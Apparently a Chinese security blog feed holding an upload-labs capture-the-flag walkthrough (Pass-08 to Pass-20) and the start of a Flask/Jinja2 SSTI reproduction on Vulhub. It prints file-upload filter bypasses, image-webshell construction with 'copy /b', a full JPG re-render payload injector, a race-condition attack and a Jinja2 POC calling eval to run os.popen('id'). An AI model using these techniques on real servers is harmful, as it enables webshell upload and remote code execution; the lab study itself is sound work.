绕过方法用burp将上传文件后缀改为.php.即可，详细原理与Pass-06类似 Pass-08 ::&#36;DATA绕过代码分析1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 可以看到，与前面第七关的代码相比，少了去除文件名的”::$DATA”字符串这一步。这里还是利用windows的一个特性。 NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。 简单讲就是在php+windows的情况下：如果文件名+”::&#36;DATA”会把::&#36;DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::&#36;DATA”之前的文件名。 注:仅windows适用喔 绕过方法由上分析，可知，用burp将上传文件后缀改为:xx.php::$DATA即可。 Pass-09 点空格点绕过代码分析123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 可以看到，这里代码的安全性比之前的都要更高，黑名单类型全，大小写经过转换，去除了文件名末尾的点，去除了文件名尾空格，还去除了::&#36;DATA。。但是，这里还是可以绕过的。这里的代码逻辑是先删除文件名末尾的点，再进行首尾去空。都只进行一次。故可以构造点空格点进行绕过，也就是后缀名改为xx.php. .，也是利用了Windows的特性。也就是说，如果从第三关到第九关，如果目标服务器是windows系统的话，均可用点空格点绕过。 绕过方法将后缀名改为xx.php. .即可 Pass-10 双写绕过代码分析12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,"", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 这里代码没有了之前关卡里的去除文件尾点、空格、::&#36;DATA的操作，估计是针对非Windows系统的。这里存在的问题是，利用str_ireplace对黑名单里的文件后缀名进行了替换，换成空字符，使用了str_ireplace函数，即不区分大小写，故大小写绕过不适用。但是这里替换是替换成了空字符，于是我们可以双写后缀名，如.pphphp,使得替换后的后缀名为php。 绕过方法用burp修改后缀名为 .pphphp Pass-11 00截断代码分析123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else&#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; &#125;&#125; 可以发现，这里与之前代码相比，使用了白名单，只允许上传，jpg，png，gif三种格式文件。但是在进行move_uploaded_file前。利用$_GET[‘sava_path’]和随机时间函数进行拼接，拼接成文件存储路径。这里构造文件存储路径利用了$_GET传入，导致服务器最终存储的文件名可控。故可以利用这个点进行绕过。这里利用的是00截断。即move_uploaded_file函数的底层实现类似于C语言，遇到0x00会截断 截断条件： 1、php版本小于5.3.4 2、php.ini的magic_quotes_gpc为OFF状态 绕过方法首先确认自己的环境的php版本环境是否符合条件。其次查看php.ini配置文件中的magic_quotes_gpc是否为Off。我这里是php版本换成了5.2构造sava_path=/upload/1.php%00绕过 Pass-12代码分析123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = "上传失败"; &#125; &#125; else &#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; &#125;&#125; 这里代码与上面Pass-11代码类似，不过是save_path参数由GET传入变为POST传入，利用原理也是00截断。故这里不再叙述 绕过方法参照Pass-11 Pass-13 图片马 unpack代码分析12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename)&#123; $file = fopen($filename, "rb"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack("C2chars", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = "文件未知，上传失败！"; &#125;else&#123; $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;&#125; 从这一关开始上传图片马，结合文件包含进行攻击。题目页面描述如下图 这里代码意思是，将上传的文件读取先读取两字节，通过对比文件头来确认文件类型。于是就可以制作图片马，将php语句隐藏在图片中，然后结合文件包含漏洞执行php。 绕过方法利用windows的cmd命令制作copy制作图片马copy 1.jpg /b + shell.php /a shell.jpg制作完图片马后直接上传，然后利用文件包含即可。 Pass-14 图片马 getimagesize()代码分析12345678910111213141516171819202122232425262728293031function isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = "文件未知，上传失败！"; &#125;else&#123; $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;&#125; 这里getimagesize()函数解释如下 绕过方法与上面一致 Pass-15 exif_imagetype()代码分析1234567891011121314151617181920212223242526272829303132333435function isImage($filename)&#123; //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return "gif"; break; case IMAGETYPE_JPEG: return "jpg"; break; case IMAGETYPE_PNG: return "png"; break; default: return false; break; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = "文件未知，上传失败！"; &#125;else&#123; $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;&#125; exif_imagetype函数说明如下 绕过方法同Pass-13一样，生成图片马上传 Pass-16 二次渲染绕过参考：https://xz.aliyun.com/t/2657 讲的很细 代码分析123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,"."),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == "jpg") &amp;&amp; ($filetype=="image/jpeg"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = "该文件不是jpg格式的图片！"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).".jpg"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;else if(($fileext == "png") &amp;&amp; ($filetype=="image/png"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = "该文件不是png格式的图片！"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).".png"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;else if(($fileext == "gif") &amp;&amp; ($filetype=="image/gif"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = "该文件不是gif格式的图片！"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).".gif"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;else&#123; $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！"; &#125;&#125; 可以看到，这里先是判断Content-Type，然后再用imagecreatefrom[gif|png|jpg]函数判断是否是图片格式，如果是图片的话再用image[gif|png|jpg]函数对其进行二次渲染。 我们可以上传一个正常的图片文件，观察其上传前和上传后图片的二进制流是否发生变化，比如我用copy命令生成了shell.jpg，用十六进制编辑器打开可以看到,文件末尾有我加入的php语句。 将其上传，将服务器保存的即被二次渲染过的图片保存下来。 将被二次渲染过的图片用十六进制编辑器打开，如图,可以看到，图片的大小大幅减小，且前面加入的PHP代码也不见了。 绕过方法由上面分析可知，如果想要绕过二次渲染的话，就要搞清楚二次渲染后，源文件哪些区域不会被修改或压缩。这里因为gif、jpg、png三种不同图片文件的文件格式不同，所以图片马的构造方法也不同，具体可以参考:https://xz.aliyun.com/t/2657我这里也简单提炼写一下。 gifgif二次渲染绕过说是最简单的。将源文件和二次渲染过的文件进行比较，找出源文件中没有被修改的那段区域，在那段区域写入php代码即可。用UE的比较功能，可以迅速找到两者匹配的地方。在匹配处写入php代码即可。 pngpng和jpg当然没有gif这么简单。这里我也不细分析了(分析不来~~)直接记个方法,将php代码写入IDAT数据块。用国外大牛的脚本123456789101112131415161718192021222324&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,'./1.png');?&gt; 直接运行该脚本生成1.png上传即可，生成的1.png如下图 jpgjpg也是用国外大牛脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168&lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs "Something's wrong". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = "&lt;?=phpinfo();?&gt;"; if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) &#123; die('php-gd is not installed'); &#125; if(!isset($argv[1])) &#123; die('php jpg_payload.php &lt;jpg_name.jpg&gt;'); &#125; set_error_handler("custom_error_handler"); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die('Incorrect SOI marker'); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat("\0",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat("\0",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage('payload_'.$argv[1], $outStream)) &#123; die('Success!'); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink('payload_'.$argv[1]); die('Something\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = ''; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die('End Of File'); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die('End Of File'); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125;?&gt; 使用方法： 先将一张正常的jpg图片上传，上传后将服务器存储的二次渲染的图片保存下来。 将保存下来经过服务器二次渲染的那张jpg图片，用此脚本进行处理生成payload.jpg 然后再上传payload.jpg 上面顺序注意一下，如果不成功的话，多换几张的jpg试试 Pass-17 条件竞争代码分析1234567891011121314151617181920212223$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,".")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; unlink($upload_file); &#125; &#125;else&#123; $msg = '上传出错！'; &#125;&#125; 不难发现，这里是先move_uploaded_file函数将上传文件临时保存，再进行判断，如果不在白名单里则unlink删除，在的话就rename重命名，所以这里存在条件竞争。 绕过方法用burp开启两个intruder模块，一个用于重复上传，另一个用于重复访问。1、先设置上传请求,记住此处的文件名，等下要用来拼接访问请求的url2、因为此处没有什么参数需要爆破，只是需要重复发起请求，所以payload设置为Null payloads,设置访问次数5000次，线程50个 接下来设置访问请求1、浏览器构造请求url：http://127.0.0.1/upload-labs-master/upload/miracle778.php,进行访问，然后用burp抓包2、burp抓包后发送至intruder模块，然后设置payload，这一步和上传请求设置差不多,都是Null payloads、5000次、50个线程 设置好两个模块后同时启动，观察结果，因为我们传入的php代码是phpinfo();,所以如果访问成功的话，会返回php的配置信息。可以看到，5000次里有3次访问成功，剩下的访问次数里，有小部分是状态码返回200，但执行出错剩下大部分访问结果是状态码是404。由此可得出结论，条件竞争绕过存在一定概率，实践中如果一次不成功，可以多试几次。 Pass-18 条件竞争代码分析这里代码太长，就不贴了，简单截个图可以看到，这里先将上传的文件保存（move函数），再rename重命名一下。所以也存在条件竞争，绕过方法和上面Pass-17差不多，这里就不重复写了。 绕过方法参照Pass-17 Pass-19 ./绕过代码分析12345678910111213141516171819202122232425$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess"); $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = '上传出错！'; &#125; &#125;else&#123; $msg = '禁止保存为该类型文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 这里关于pathinfo的说明如下图 可以看到，这里img_path可控（通过post sava_name），所以可以利用move_uploaded_file的\x00截断(save_name=1.php%00.jpg)绕过,但\x00截断之前关卡已经出现过了，这里明显是考察别的知识点。于是网上找找别人的答案，发现考点是:move_uploaded_file会忽略掉文件末尾的/.所以可以构造save_path=1.php/.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php 绕过方法 post: save_name = 1.php%00.jpg post: save_name = 1.php/. Pass-20 数组/.绕过代码分析123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES['upload_file']))&#123; //检查MIME $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type))&#123; $msg = "禁止上传该类型文件!"; &#125;else&#123; //检查文件名 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) &#123; $file = explode('.', strtolower($file)); &#125; $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) &#123; $msg = "禁止上传该后缀文件!"; &#125;else&#123; $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = "文件上传成功！"; $is_upload = true; &#125; else &#123; $msg = "文件上传失败！"; &#125; &#125; &#125;&#125;else&#123; $msg = "请选择要上传的文件！";&#125; 可以看到，上面第6行先进行了一个Content-Type判断，10-13行，如果save_name是字符串的话就通过explode函数，将post进去的save_name转成小写后按’.’打散成数组。而15-20行里的$file_name会经过reset($file) . &#39;.&#39; . $file[count($file) - 1];处理，而&#36;file[count(&#36;file)-1]和end(&#36;file)是相等的，也就是说，如果save_name是字符串形式传入的话，想要绕过白名单话，file_name必为gif、png、jpg，无法达到上传php的目的。所以save_name不能以字符串形式传入。而应该以数组形式传入，从而绕过explode过程，构建特殊数组，使得end(&#36;file)能绕过白名单，而&#36;file[count(&#36;file) - 1]不等于jpg或png或gif。这里可以构造save_name[0] = 1.php/,save_name[2] = jpg,这样的话end(&#36;file)为jpg，而&#36;file[count(&#36;file) - 1]为&#36;file[1]为空。所以最终file_name=1.php/.,到这里就跟Pass-19一样了。 绕过方法如图 小小总结这个20关做下来，感觉大多数文件上传类型都讲到了。这个项目官方github上面也有一张总结图，感觉挺到位，就拿过来好了。 参考链接Upload-labs 20关通关笔记Upload-labs之pass 16详细分析]]></content>
      <categories>
        <category>Web安全</category>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[flask ssti漏洞复现]]></title>
    <url>%2F%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2Fflask-ssti%2Fflask-ssti%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.html</url>
    <content type="text"><![CDATA[开一个新坑关于漏洞复现，通过复现漏洞去学习一些东西,vulhub有太多环境了，这里先从一些自己比较熟悉的开始学习。所以选择了flask/ssti Vulhub是一个基于docker和docker-compose的漏洞环境集合，进入对应目录并执行一条语句即可启动一个 全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。 分享一个好用的漏洞环境：Vulhub 前言flask/ssti漏洞，完整叫法应该是: Flask（Jinja2） 服务端模板注入漏洞(SSTI)。上网找了找别人的分析文章。看了一大圈下来，发现都没怎么讲原理，都是直接开干，或许是这个漏洞太简单了吧233~。不过最后还是找到一篇提了提原理的博客。贴在下面好了，因为我之前略微学了几天flask，所以这个漏洞原理理解复现起来还是挺顺畅的。Flask（Jinja2） 服务端模板注入漏洞(SSTI) 基础知识0x01 FlaskFlask简介Flask 是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 。Flask 为你提供工具，库和技术来允许你构建一个 web 应用程序。这个 web 应用程序可以是一些 web 页面、博客、wiki、基于 web 的日历应用或商业网站。 Flask简单示例flask简单易学，下面代码是flask版的hello world12345678from flask import Flaskapp = Flask(__name__)@app.route("/")def hello(): return "Hello World!" if __name__ == "__main__": app.run() 简单说下上面代码，第1、2行是初始化过程。3-5行是使用Flask提供的app.route修饰器,把修饰的函数注册为路由。简单讲就是当访问http&#58;//xxx.xx.xx/时，使用hello函数进行处理响应。 flask就简单这么提一下吧，具体的我也写不来，毕竟这是分析flask/ssti漏洞，不是flask学习笔记，而且我flask也就之前看过几天。如果有想仔细学flask的兄贵的话，我只能在下面贴个pdf链接了。。Flask-Web开发:基于Python的Web应用开发实战 0x02 Jinja2Jinja2简介Jinja 2是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的。Jinja支持python语句 Jinja2 模版部分语法 变量 Jinja2 使用结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取 Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量name的值。 1Hello, &#123;&#123; name|capitalize &#125;&#125; if&amp;for语句if语句简单示例 12345&#123;% if user %&#125; Hello,&#123;&#123;user&#125;&#125; !&#123;% else %&#125; Hello,Stranger!&#123;% endif %&#125; for语句循环渲染一组元素 12345&lt;ul&gt; &#123;% for comment in comments %&#125; &lt;li&gt;&#123;&#123;comment&#125;&#125;&lt;/li&gt; &#123;% endfor %&#125;&lt;/ul&gt; 漏洞原理0x01 查看源码 cd进flask/ssti目录，开启ssti环境 访问一下目标环境,可以看到开启成功 接下来看一下网页app.py源码 1234567891011121314from flask import Flask, requestfrom jinja2 import Templateapp = Flask(__name__)@app.route("/")def index(): name = request.args.get('name', 'guest') t = Template("Hello " + name) return t.render()if __name__ == "__main__": app.run() 0x02 漏洞成因分析可以看到上面第10行代码 t = Template(&quot;Hello &quot; + name),Template()完全可控，那么就可以直接写入jinja2的模板语言，如下图，页面返回54289，证明存在ssti漏洞 0x03 漏洞预防测试当然这不是jinja 2的问题，而是网站开发人员的疏漏，如果我们可以对上面代码稍作修改，即可以避免1234567891011121314from flask import Flask, requestfrom jinja2 import Templateapp = Flask(__name__)@app.route("/safe")def index(): name = request.args.get('name', 'guest') t = Template("Hello,&#123;&#123;n&#125;&#125; ") return t.render(n=name)if __name__ == "__main__": app.run() 上面修改后代码第6行，将其路由到/safe页面进行访问测试,可以看到原本存在的代码注入漏洞就不存在了 漏洞利用前面分析了ssti漏洞成因，现在就来讲讲如何利用这个注入漏洞搞点事情。首先给出vulhub官网上的文档的POC，后面再分析原理。 获取eval函数执行任意代码测试Vulhub上的ssti文档是直接给了个获取eval函数并执行任意python代码的POC1234567891011&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if 'eval' in b.keys() %&#125; &#123;&#123; b['eval']('__import__("os").popen("id").read()') &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 